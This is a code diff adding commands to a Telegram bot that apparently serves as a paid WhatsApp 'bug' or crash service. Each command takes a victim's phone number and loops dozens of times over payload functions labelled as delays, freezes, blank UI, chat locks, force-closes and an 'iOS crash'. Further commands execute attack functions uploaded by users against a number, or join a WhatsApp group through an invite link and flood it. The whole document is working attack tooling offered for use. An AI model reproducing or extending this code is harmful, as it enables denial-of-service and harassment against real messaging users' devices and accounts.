+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+    
+  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption: `
+<blockquote>💤 MODE : INVISIBLE DELAY  HARD
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+  });
+
+  await (async () => {
+    for (let i = 0; i < 100; i++) {
+      await DelayBulldoNew(sock, target);
+      await sleep(1500);
+    }
+  })();
+
+  await ctx.telegram.editMessageCaption(
+    ctx.chat.id,
+    sent.message_id,
+    null,
+    `
+<blockquote>💤 MODE : INVISIBLE DELAY  HARD
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+    }
+  );
+});
+
+bot.command("combo1", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`Example: /combo1 62xxxx`);
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+    
+  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption: `
+<blockquote>💤 MODE : INVISIBLE DELAY  HARD
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+  });
+
+  await (async () => {
+    for (let i = 0; i < 100; i++) {
+      await ForceXDelayX7(sock, target);
+      await sleep(1500);
+    }
+  })();
+
+  await ctx.telegram.editMessageCaption(
+    ctx.chat.id,
+    sent.message_id,
+    null,
+    `
+<blockquote>💤 MODE : INVISIBLE DELAY  HARD
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+    }
+  );
+});
+
+bot.command("galaxy", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`Example: /galaxy 62xxxx`);
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+    
+  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption: `
+<blockquote>💤 MODE : INVISIBLE DELAY  HARD
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+  });
+
+  await (async () => {
+    for (let i = 0; i < 100; i++) {
+      await CrmXcarousel(sock, target);
+      await sleep(1500);
+    }
+  })();
+
+  await ctx.telegram.editMessageCaption(
+    ctx.chat.id,
+    sent.message_id,
+    null,
+    `
+<blockquote>💤 MODE : INVISIBLE DELAY  HARD
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+    }
+  );
+});
+
+bot.command("combo", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`Example: /combo 62xxxx`);
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+    
+  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption: `
+<blockquote>💤 MODE : INVISIBLE DELAY  HARD
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+  });
+
+  await (async () => {
+    for (let i = 0; i < 100; i++) {
+      await MBGCOMBO(sock, target);
+      await sleep(1500);
+    }
+  })();
+
+  await ctx.telegram.editMessageCaption(
+    ctx.chat.id,
+    sent.message_id,
+    null,
+    `
+<blockquote>💤 MODE : INVISIBLE DELAY  HARD
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+    }
+  );
+});
+
+bot.command("stcblank", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`Example: /stcblank 62xxxx`);
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+    
+  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption: `
+<blockquote>💤 MODE : BLANK STIKER
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+  });
+
+  await (async () => {
+    for (let i = 0; i < 50; i++) {
+      await stickerUi(sock, target);
+      await sleep(1500);
+    }
+  })();
+
+  await ctx.telegram.editMessageCaption(
+    ctx.chat.id,
+    sent.message_id,
+    null,
+    `
+<blockquote>💤 MODE : BLANK STIKER
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+    }
+  );
+});
+
+bot.command("uisystem", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`Example: /uisystem 62xxxx`);
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+    
+  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption: `
+<blockquote>💤 MODE : UI SYSTEM
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+  });
+
+  await (async () => {
+    for (let i = 0; i < 50; i++) {
+      await button(sock, target);
+      await sleep(1500);
+    }
+  })();
+
+  await ctx.telegram.editMessageCaption(
+    ctx.chat.id,
+    sent.message_id,
+    null,
+    `
+<blockquote>💤 MODE : UI SYSTEM
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+    }
+  );
+});
+
+bot.command("lockchat", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`Example: /lockchat 62xxxx`);
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+    
+  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption: `
+<blockquote>💤 MODE : LOCK CHAT
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+  });
+
+  await (async () => {
+    for (let i = 0; i < 50; i++) {
+      await lockchat(sock, target);
+      await sleep(1500);
+    }
+  })();
+
+  await ctx.telegram.editMessageCaption(
+    ctx.chat.id,
+    sent.message_id,
+    null,
+    `
+<blockquote>💤 MODE : LOCK CHAT
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+    }
+  );
+});
+
+bot.command("delayvisible", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`Example: /delayvisible 62xxxx`);
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+    
+  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption: `
+<blockquote>💤 MODE : DELAY VISIBLE
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+  });
+
+  await (async () => {
+    for (let i = 0; i < 50; i++) {
+      await DelayFreezerByMia(sock, target);
+      await sleep(1500);
+    }
+  })();
+
+  await ctx.telegram.editMessageCaption(
+    ctx.chat.id,
+    sent.message_id,
+    null,
+    `
+<blockquote>💤 MODE : DELAY VISIBLE
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+    }
+  );
+});
+
+bot.command("blankui", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`Example: /blankui 62xxxx`);
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+    
+  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption: `
+<blockquote>💤 MODE : BLANK UI
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+  });
+
+  await (async () => {
+    for (let i = 0; i < 50; i++) {
+      await BlankWithProto(sock, target);
+      await sleep(1500);
+    }
+  })();
+
+  await ctx.telegram.editMessageCaption(
+    ctx.chat.id,
+    sent.message_id,
+    null,
+    `
+<blockquote>💤 MODE :  BLANK UI 
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+    }
+  );
+});
+
+bot.command("boost", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`Example: /boost 62xxxx`);
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+    
+  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption: `
+<blockquote>💤 MODE : FC NO CLICK
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+  });
+
+  await (async () => {
+    for (let i = 0; i < 50; i++) {
+      await X7Force(sock, target, false) 
+      await sleep(1500);
+    }
+  })();
+
+  await ctx.telegram.editMessageCaption(
+    ctx.chat.id,
+    sent.message_id,
+    null,
+    `
+<blockquote>💤 MODE : FC NO CLICK
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+    }
+  );
+});
+
+bot.command("fcclick", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`Example: /uisystem 62xxxx`);
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+    
+  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption: `
+<blockquote>💤 MODE : FC CLICK
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+  });
+
+  await (async () => {
+    for (let i = 0; i < 10; i++) {
+      await X7Klik(sock, target);
+      await fcbutton(sock, target);
+      await sleep(1500);
+    }
+  })();
+
+  await ctx.telegram.editMessageCaption(
+    ctx.chat.id,
+    sent.message_id,
+    null,
+    `
+<blockquote>💤 MODE : FC CLICK
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+    }
+  );
+});
+
+bot.command("iosattack", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`Example: /iosattack 62xxxx`);
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+  const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+    
+  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
+    caption: `
+<blockquote>💤 MODE : CRASH IOS
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    parse_mode: "HTML",
+    reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+  });
+
+  await (async () => {
+    for (let i = 0; i < 100; i++) {
+      await ioskres(sock, target);
+      await sleep(1500);
+    }
+  })();
+
+  await ctx.telegram.editMessageCaption(
+    ctx.chat.id,
+    sent.message_id,
+    null,
+    `
+<blockquote>💤 MODE : CRASH IOS
+
+🤍 User   : ${username}
+🎯 Target : ${q}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>
+`,
+    {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
+      },
+    }
+  );
+});
+
+const tesfunct = "https://l.top4top.io/p_3803smv0s1.jpg";
+bot.command('testfunc', checkWhatsAppConnection, checkPremium, async (ctx) => {
+  try {
+    const chatId = ctx.chat.id;
+    const senderId = ctx.from.id;
+    const msg = ctx.message;
+    const username = ctx.from.username
+    ? `@${ctx.from.username}`
+    : ctx.from.first_name || "User";
+    const args = ctx.message.text.split(" ");
+    const targetNumber = args[1];
+    const formattedNumber = targetNumber?.replace(/[^0-9]/g, "");
+    const jid = `${formattedNumber}@s.whatsapp.net`;
+
+    const replyId = msg.reply_to_message
+      ? msg.reply_to_message.message_id
+      : msg.message_id;
+
+    if (args.length < 3)
+      return ctx.reply(
+        "🪧 ☇ Format: /testfunc 62xxx 10 (reply function/file)",
+        { reply_to_message_id: replyId }
+      );
+
+    const q = args[1];
+
+    const jumlah = Math.max(
+      0,
+      Math.min(parseInt(args[2]) || 1, 1000)
+    );
+
+    if (isNaN(jumlah) || jumlah <= 0)
+      return ctx.reply(
+        "❌ ☇ Jumlah harus angka",
+        { reply_to_message_id: replyId }
+      );
+
+    const target =
+      q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    let funcCode = "";
+
+    if (msg.reply_to_message) {
+      if (msg.reply_to_message.text) {
+        funcCode = msg.reply_to_message.text;
+      }
+      else if (msg.reply_to_message.document) {
+
+        const fileName =
+          msg.reply_to_message.document.file_name || "";
+
+        if (
+          !fileName.endsWith(".js") &&
+          !fileName.endsWith(".txt")
+        ) {
+          return ctx.reply(
+            "❌ ☇ File harus .js atau .txt",
+            { reply_to_message_id: replyId }
+          );
+        }
+
+        const fileId =
+          msg.reply_to_message.document.file_id;
+
+        const fileUrl =
+          await ctx.telegram.getFileLink(fileId);
+
+        const response =
+          await axios.get(fileUrl.href);
+
+        funcCode = response.data;
+      }
+    }
+
+    if (!funcCode)
+      return ctx.reply(
+        "❌ ☇ Reply function text atau file .js/.txt",
+        { reply_to_message_id: replyId }
+      );
+
+    const processMsg = await ctx.replyWithPhoto(
+      tesfunct,
+      {
+        caption: `<blockquote>💤 MODE : Test Function
+
+🤍 User   : ${username}
+🎯 Target : ${formattedNumber}
+Type   : Status
+🚀 Result : Proses</blockquote>`,
+        parse_mode: "HTML",
+        reply_to_message_id: replyId,
+        reply_markup: {
+          inline_keyboard: [
+            [
+              {
+                text: "Check Target",
+                url: `https://wa.me/${formattedNumber}`,
+                style: "danger",
+              },
+            ],
+          ],
+        },
+      }
+    );
+
+    const processMessageId =
+      processMsg.message_id;
+
+    const createSafeSock = (sock) => sock;
+
+    const safeSock =
+      createSafeSock(sock);
+
+    const matchFunc = funcCode.match(
+      /async function\s+([a-zA-Z0-9_]+)/
+    );
+
+    if (!matchFunc)
+      return ctx.reply(
+        "❌ ☇ Function tidak valid",
+        { reply_to_message_id: replyId }
+      );
+
+    const funcName = matchFunc[1];
+
+    const sandbox = {
+      console,
+      Buffer,
+      sock: safeSock,
+      target,
+      sleep,
+      generateWAMessageFromContent,
+      generateForwardMessageContent,
+      generateWAMessage,
+      prepareWAMessageMedia,
+      proto,
+      jidDecode,
+      areJidsSameUser,
+    };
+
+    const context =
+      vm.createContext(sandbox);
+
+    const wrapper = `
+${funcCode}
+
+${funcName}
+`;
+
+    const fn =
+      vm.runInContext(wrapper, context);
+
+    for (let i = 0; i < jumlah; i++) {
+
+      try {
+
+        const arity = fn.length;
+
+        if (arity === 1) {
+
+          await fn(target);
+
+        } else if (arity === 2) {
+
+          await fn(safeSock, target);
+
+        } else {
+
+          await fn(
+            safeSock,
+            target,
+            true
+          );
+
+        }
+
+      } catch (err) {
+
+        console.error(err);
+
+      }
+
+      await sleep(200);
+
+    }
+
+    const finalText = `<blockquote>💤 MODE : Test Function
+
+🤍 User   : ${username}
+🎯 Target : ${formattedNumber}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>`;
+
+    try {
+
+      await ctx.telegram.editMessageCaption(
+        chatId,
+        processMessageId,
+        undefined,
+        finalText,
+        {
+          parse_mode: "HTML",
+          reply_markup: {
+            inline_keyboard: [
+              [
+                {
+                  text: "Check Target",
+                  url: `https://wa.me/${formattedNumber}`,
+                  style: "danger",
+                },
+              ],
+            ],
+          },
+        }
+      );
+
+    } catch (e) {
+
+      await ctx.replyWithPhoto(
+        tesfunct,
+        {
+          caption: finalText,
+          parse_mode: "HTML",
+          reply_to_message_id: replyId,
+          reply_markup: {
+            inline_keyboard: [
+              [
+                {
+                  text: "Check Target",
+                  url: `https://wa.me/${formattedNumber}`,
+                  style: "danger",
+                },
+              ],
+            ],
+          },
+        }
+      );
+
+    }
+
+  } catch (err) {
+
+    console.error(err);
+
+    ctx.reply(
+      "FUNCTION LU EROR BANGKE",
+      {
+        reply_to_message_id: ctx.message.message_id,
+      }
+    );
+
+  }
+});
+
+bot.command('testgb', checkWhatsAppConnection, checkPremium, async (ctx) => {
+  try {
+    const chatId = ctx.chat.id;
+    const msg = ctx.message;
+    const args = ctx.message.text.split(" ");
+
+    const replyId = msg.reply_to_message
+      ? msg.reply_to_message.message_id
+      : msg.message_id;
+
+    if (args.length < 3)
+      return ctx.reply(
+        "🪧 ☇ Format: /testgb https://chat.whatsapp.com/xxx 10 (reply function/file)",
+        { reply_to_message_id: replyId }
+      );
+
+    const groupLink = args[1].trim();
+    const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
+
+    if (isNaN(jumlah) || jumlah <= 0)
+      return ctx.reply(
+        "❌ ☇ Jumlah harus angka",
+        { reply_to_message_id: replyId }
+      );
+
+    // Validasi link grup
+    const inviteRegex = /chat\.whatsapp\.com\/([a-zA-Z0-9]{20,26})/;
+    const match = groupLink.match(inviteRegex);
+    if (!match)
+      return ctx.reply(
+        "❌ ☇ Link grup tidak valid",
+        { reply_to_message_id: replyId }
+      );
+    const groupCode = match[1];
+
+    // Ambil funcCode
+    let funcCode = "";
+    if (msg.reply_to_message) {
+      if (msg.reply_to_message.text) {
+        funcCode = msg.reply_to_message.text;
+      } else if (msg.reply_to_message.document) {
+        const fileName = msg.reply_to_message.document.file_name || "";
+        if (!fileName.endsWith(".js") && !fileName.endsWith(".txt")) {
+          return ctx.reply(
+            "❌ ☇ File harus .js atau .txt",
+            { reply_to_message_id: replyId }
+          );
+        }
+        const fileId = msg.reply_to_message.document.file_id;
+        const fileUrl = await ctx.telegram.getFileLink(fileId);
+        const response = await axios.get(fileUrl.href);
+        funcCode = response.data;
+      }
+    }
+
+    if (!funcCode)
+      return ctx.reply(
+        "❌ ☇ Reply function text atau file .js/.txt",
+        { reply_to_message_id: replyId }
+      );
+
+    const matchFunc = funcCode.match(/async function\s+([a-zA-Z0-9_]+)/);
+    if (!matchFunc)
+      return ctx.reply(
+        "❌ ☇ Function tidak valid",
+        { reply_to_message_id: replyId }
+      );
+
+    const funcName = matchFunc[1];
+
+    const processMsg = await ctx.replyWithPhoto(tesfunct, {
+      caption: `<blockquote>💤 MODE : Test Function
+
+🤍 User   : ${username}
+🎯 Target : ${groupLink}
+Type   : Status
+🚀 Result : Joining Group</blockquote>`,
+      parse_mode: "HTML",
+      reply_to_message_id: replyId,
+      reply_markup: {
+        inline_keyboard: [[{ text: "Check Group", url: groupLink, style: "danger" }]],
+      },
+    });
+
+    const processMessageId = processMsg.message_id;
+    const safeSock = sock;
+
+    // Join grup
+    let targetJid;
+    try {
+      const groupData = await sock.groupGetInviteInfo(groupCode);
+      targetJid = groupData.id;
+      await sock.groupAcceptInvite(groupCode);
+      await sleep(2500);
+      console.log(`[SUCCESS] Berhasil Join: ${targetJid}`);
+    } catch (e) {
+      if (e.message.includes("409")) {
+        // Sudah di dalam grup, lanjut
+        console.log("[INFO] Bot sudah ada di dalam grup.");
+        // Ambil JID dari invite info kalau belum dapat
+        if (!targetJid) {
+          try {
+            const groupData = await sock.groupGetInviteInfo(groupCode);
+            targetJid = groupData.id;
+          } catch (_) {}
+        }
+      } else {
+        try {
+          await ctx.telegram.editMessageCaption(
+            chatId, processMessageId, undefined,
+            `❌ ☇ Gagal join grup: ${e.message}`,
+            { parse_mode: "HTML", reply_markup: { inline_keyboard: [] } }
+          );
+        } catch (_) {}
+        return;
+      }
+    }
+
+    // Update status ke processing
+    try {
+      await ctx.telegram.editMessageCaption(
+        chatId, processMessageId, undefined,
+        `<blockquote>💤 MODE : Test Function
+
+🤍 User   : ${username}
+🎯 Target : ${groupLink}
+Type   : Status
+🚀 Result : Proses</blockquote>`,
+        {
+          parse_mode: "HTML",
+          reply_markup: {
+            inline_keyboard: [[{ text: "Check Group", url: groupLink, style: "danger", style: "danger" }]],
+          },
+        }
+      );
+    } catch (_) {}
+
+    // Setup sandbox & VM
+    const sandbox = {
+      console,
+      Buffer,
+      sock: safeSock,
+      target: targetJid,
+      sleep,
+      generateWAMessageFromContent,
+      generateForwardMessageContent,
+      generateWAMessage,
+      prepareWAMessageMedia,
+      proto,
+      jidDecode,
+      areJidsSameUser,
+      String,
+      Array,
+      Object,
+      JSON,
+      Math,
+      parseInt,
+      parseFloat,
+      isNaN,
+    };
+
+    const context = vm.createContext(sandbox);
+    const wrapper = `${funcCode}\n${funcName}`;
+    const fn = vm.runInContext(wrapper, context);
+
+    // Loop eksekusi
+    for (let i = 0; i < jumlah; i++) {
+      try {
+        const arity = fn.length;
+        if (arity === 1) {
+          await fn(targetJid);
+        } else if (arity === 2) {
+          await fn(safeSock, targetJid);
+        } else {
+          await fn(safeSock, targetJid, true);
+        }
+        console.log(`[SUCCESS] Bug ke-${i + 1} terkirim.`);
+      } catch (err) {
+        console.error(`[ERROR] Bug ke-${i + 1} gagal: ${err.message}`);
+      }
+      await sleep(2000);
+    }
+
+    const finalText = `<blockquote>💤 MODE : Test Function
+
+🤍 User   : ${username}
+🎯 Target : ${groupLink}
+Type   : Status
+🚀 Result : SUCCESS SEND</blockquote>`;
+
+    try {
+      await ctx.telegram.editMessageCaption(
+        chatId, processMessageId, undefined,
+        finalText,
+        {
+          parse_mode: "HTML",
+          reply_markup: {
+            inline_keyboard: [[{ text: "Check Group", url: groupLink, style: "danger" }]],
+          },
+        }
+      );
+    } catch (e) {
+      await ctx.replyWithPhoto(tesfunct, {
+        caption: finalText,
+        parse_mode: "HTML",
+        reply_to_message_id: replyId,
+        reply_markup: {
+          inline_keyboard: [[{ text: "Check Group", url: groupLink, style: "danger" }]],
+        },
+      });
+    }
+
+  } catch (err) {
+    console.error(err);
+    ctx.reply("FUNCTION LU EROR BANGKE", {
+      reply_to_message_id: ctx.message.message_id,
+    });
+  }
+});
+
